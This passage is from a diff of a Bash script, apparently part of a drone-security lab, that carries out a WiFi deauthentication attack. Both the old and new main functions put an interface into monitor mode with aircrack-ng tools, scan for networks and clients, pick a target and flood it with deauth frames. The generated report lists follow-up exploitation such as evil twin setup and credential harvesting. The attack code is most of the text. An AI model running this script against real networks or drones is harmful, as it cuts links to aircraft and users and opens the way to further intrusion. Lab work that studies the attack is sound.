-    "ioc_file": "$IOC_FILE"
-}
+Attack Duration: ${attack_duration} seconds
+Deauth Frames Sent: $frames_sent
+Attack Method: 802.11 Deauthentication Frames
+Success Rate: $effectiveness
+
+╔═══ TARGET ANALYSIS ═══╗
+
+$(cat "$LOG_FILE" | grep -A 10 "Discovered Networks" | tail -10)
+
+╔═══ ATTACK EXECUTION ═══╗
+
+$(cat "$LOG_FILE" | grep -A 15 "Executing WiFi deauthentication attack" | tail -15)
+
+╔═══ EFFECTIVENESS ASSESSMENT ═══╗
+
+$(cat "$LOG_FILE" | grep -A 10 "Attack Effectiveness" | tail -10)
+
+╔═══ SECURITY IMPLICATIONS ═══╗
+
+1. Network Vulnerabilities
+   - Unprotected management frames
+   - Lack of 802.11w (PMF) protection
+   - Predictable reconnection behavior
+
+2. Impact Assessment
+   - Communication disruption
+   - Service denial
+   - Potential for follow-up attacks
+
+3. Attack Vectors
+   - Continuous deauthentication
+   - Client isolation
+   - Man-in-the-middle preparation
+
+╔═══ EXPLOITATION OPPORTUNITIES ═══╗
+
+1. Communication Disruption
+   - Drone-GCS link interruption
+   - Failsafe mode triggering
+   - Emergency landing scenarios
+
+2. Attack Preparation
+   - Evil twin setup preparation
+   - Credential harvesting opportunity
+   - Network topology mapping
+
+3. Persistent Attacks
+   - Automated deauth loops
+   - Multiple target coordination
+   - Timing-based attacks
+
+╔═══ DEFENSIVE RECOMMENDATIONS ═══╗
+
+1. 네트워크 보안 강화
+   - 802.11w (PMF) 활성화
+   - 강력한 암호화 사용
+   - 클라이언트 격리 설정
+
+2. 모니터링 구현
+   - 무선 침입 탐지 시스템
+   - 비정상 디스커넥션 알림
+   - RF 스펙트럼 모니터링
+
+3. 대응 방안
+   - 자동 재연결 메커니즘
+   - 백업 통신 채널
+   - 물리적 보안 조치
+
+╚═══════════════════════╝
 EOF
-    
-    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
+
+    log_success "Report saved to: $report_file"
+    echo -e "${GREEN}Report location: $report_file${NC}"
 }
 
-# 메인 공격 실행
-main() {
-    print_header
-    
-    # Root 권한 체크
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}[!] This attack requires root privileges${NC}"
-        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
-        exit 1
-    fi
-    
-    # 필수 도구 체크
-    local missing_tools=()
-    for tool in iwconfig airmon-ng aireplay-ng airodump-ng; do
-        if ! command -v "$tool" &> /dev/null; then
-            missing_tools+=("$tool")
-        fi
-    done
-    
-    if [ ${#missing_tools[@]} -gt 0 ]; then
-        echo -e "${RED}[!] Missing required tools: ${missing_tools[*]}${NC}"
-        echo -e "${YELLOW}[*] Please install: apt-get install aircrack-ng wireless-tools${NC}"
-        exit 1
-    fi
-    
-    # 로그 초기화
-    echo "=== DVD WiFi Deauth Attack Started at $(date) ===" > "$LOG_FILE"
-    echo "" > "$IOC_FILE"
-    
-    local start_time=$(date +%s)
-    
-    echo -e "${BOLD}${BLUE}🎯 Starting WiFi Deauthentication Attack...${NC}"
-    echo ""
-    
-    # 1. WiFi 인터페이스 설정
-    if ! setup_interface; then
-        echo -e "${RED}[!] Failed to setup WiFi interface${NC}"
-        exit 1
-    fi
-    
-    # 2. 드론 네트워크 스캔
-    if ! scan_drone_networks; then
-        echo -e "${YELLOW}[*] No drone networks found, using manual target${NC}"
-        # 수동으로 일반적인 드론 네트워크 시뮬레이션
-        TARGET_BSSID="AA:BB:CC:DD:EE:FF"
-        TARGET_CHANNEL="6"
-        echo "DOS_TARGET:SIMULATED_DRONE_NETWORK" >> "$IOC_FILE"
-    fi
-    
-    # 3. 타겟 채널 설정
-    if [ -n "$TARGET_CHANNEL" ]; then
-        set_target_channel
-    fi
-    
-    # 4. 클라이언트 스캔
-    if [ -n "$TARGET_BSSID" ]; then
-        scan_clients "$TARGET_BSSID" "$TARGET_CHANNEL"
-    fi
-    
-    # 5. Deauth 공격 실행
-    echo ""
-    echo -e "${BOLD}${RED}🚨 Executing Deauthentication Attack...${NC}"
-    echo ""
-    
-    if [ -n "$TARGET_BSSID" ]; then
-        execute_deauth_attack "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$DEAUTH_COUNT"
-    else
-        echo -e "${RED}[!] No target available for attack${NC}" | tee -a "$LOG_FILE"
-    fi
-    
-    # 6. 공격 효과 모니터링
-    monitor_attack_effectiveness
-    
-    # 7. 인터페이스 복원
-    restore_interface
-    
-    local end_time=$(date +%s)
-    
-    echo ""
-    echo -e "${BOLD}${GREEN}🎯 WiFi Deauthentication Attack Completed!${NC}"
-    echo ""
-    echo -e "${GREEN}📊 Attack Summary:${NC}"
-    echo "   • Duration: $((end_time - start_time)) seconds"
-    echo "   • Target BSSID: ${TARGET_BSSID:-"N/A"}"
-    echo "   • Channel: ${TARGET_CHANNEL:-"N/A"}"
-    echo "   • Deauth Frames: ${DEAUTH_COUNT}"
-    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
-    echo ""
-    echo -e "${BLUE}📁 Output Files:${NC}"
-    echo "   • Log: ${LOG_FILE}"
-    echo "   • IOCs: ${IOC_FILE}"
-    echo "   • JSON Report: ${JSON_OUTPUT}"
-    
-    # JSON 리포트 생성
-    generate_json_report "$start_time" "$end_time"
-    
-    echo ""
-    echo -e "${YELLOW}💡 Next Steps:${NC}"
-    echo "   1. Monitor drone communication recovery"
-    echo "   2. Check for automatic reconnection attempts"
-    echo "   3. Analyze wireless traffic logs"
-    echo "   4. Review generated IOCs for patterns"
-    echo ""
-    
-    # IOCs 요약 출력
-    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
-    cat "$IOC_FILE" | sort | uniq -c | head -10
-    echo ""
-}
-
-# cleanup 함수
 cleanup() {
-    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
-    restore_interface 2>/dev/null
-    exit 0
+    log_info "Cleaning up..."
+    
+    # 모니터 모드 정리
+    if [[ -n "$MONITOR_INTERFACE" ]]; then
+        echo -e "${YELLOW}[*] Disabling monitor mode on $MONITOR_INTERFACE...${NC}"
+        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
+    fi
+    
+    # 임시 파일 정리
+    rm -f /tmp/wifi_scan_* /tmp/client_scan_* 2>/dev/null
+    
+    # 백그라운드 프로세스 정리
+    pkill -f "aireplay-ng" 2>/dev/null
+    pkill -f "airodump-ng" 2>/dev/null
 }
 
-# SIGINT 시그널 처리
-trap cleanup SIGINT SIGTERM
+main() {
+    print_banner
+    check_prerequisites
+    
+    log_info "Starting WiFi deauthentication attack..."
+    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
+    echo "Timestamp: $(date)" >> "$LOG_FILE"
+    echo "================================" >> "$LOG_FILE"
+    
+    # 무선 인터페이스 감지
+    local interface=$(detect_wireless_interfaces)
+    if [[ -z "$interface" ]]; then
+        log_error "No wireless interface found"
+        exit 1
+    fi
+    
+    # 모니터 모드 설정
+    local monitor_iface=$(setup_monitor_mode "$interface")
+    if [[ -z "$monitor_iface" ]]; then
+        log_error "Failed to setup monitor mode"
+        exit 1
+    fi
+    
+    export MONITOR_INTERFACE="$monitor_iface"
+    
+    # 네트워크 스캔
+    echo -e "\n${BLUE}[*] Scanning for WiFi networks...${NC}"
+    local scan_file=$(scan_networks "$monitor_iface" 20)
+    if [[ -z "$scan_file" ]]; then
+        log_error "Network scan failed"
+        cleanup
+        exit 1
+    fi
+    
+    # 스캔 결과 파싱
+    parse_scan_results "$scan_file" | tee -a "$LOG_FILE"
+    
+    if [[ ${#DISCOVERED_NETWORKS[@]} -eq 0 ]]; then
+        log_error "No networks discovered"
+        cleanup
+        exit 1
+    fi
+    
+    # 타겟 네트워크 선택
+    echo -e "\n${BLUE}[*] Selecting target network...${NC}"
+    local target_info=$(select_target_network)
+    local target_bssid=$(echo "$target_info" | cut -d: -f1)
+    local target_essid=$(echo "$target_info" | cut -d: -f2)
+    local target_channel=$(echo "$target_info" | cut -d: -f3)
+    
+    # 클라이언트 스캔
+    echo -e "\n${BLUE}[*] Scanning for connected clients...${NC}"
+    local clients=$(scan_clients "$monitor_iface" "$target_bssid" "$target_channel" 15)
+    
+    # 공격 실행
+    echo -e "\n${BLUE}[*] Executing deauthentication attack...${NC}"
+    local attack_results=$(execute_deauth_attack "$monitor_iface" "$target_bssid" "$target_essid" "$target_channel" "$clients" 60)
+    
+    # 효과 모니터링
+    echo -e "\n${BLUE}[*] Monitoring attack effectiveness...${NC}"
+    monitor_attack_effectiveness "$monitor_iface" "$target_bssid" "$target_channel" "$clients" | tee -a "$LOG_FILE"
+    
+    # 보고서 생성
+    local effectiveness=$(cat "$LOG_FILE" | grep "Attack effectiveness:" | tail -1 | awk '{print $3}')
+    generate_attack_report "$target_bssid" "$target_essid" "$attack_results" "$effectiveness"
+    
+    cleanup
+    
+    log_success "WiFi deauthentication attack completed"
+    echo "Attack completed at $(date)" >> "$LOG_FILE"
+}
 
-# 스크립트 실행
+# Signal handlers for graceful cleanup
+trap cleanup EXIT
+trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM
+
+# Execute main function
 main "$@"
